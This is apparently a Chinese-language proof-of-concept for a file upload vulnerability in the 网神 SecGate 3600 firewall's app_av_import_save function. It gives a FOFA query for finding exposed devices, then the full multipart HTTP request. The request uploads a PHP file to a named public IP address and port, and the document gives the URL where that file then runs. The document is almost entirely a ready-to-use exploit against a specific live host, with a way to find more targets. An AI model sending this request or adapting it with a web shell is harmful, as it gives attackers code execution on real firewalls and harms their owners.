# 网神 SecGate 3600 防火墙 app_av_import_save 文件上传漏洞

    ## fofa

```
title="网神SecGate 3600防火墙"
```

## poc

```
POST / HTTP/1.1
Host: 111.121.226.71:4433
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
Accept-Encoding: gzip
Content-Length: 421

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="fsdfsdfsdf.php"
Content-Type: text/plain

<?php print(md5(233));
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```

https://111.121.226.71:4433/attachements/fsdfsdfsdf.php
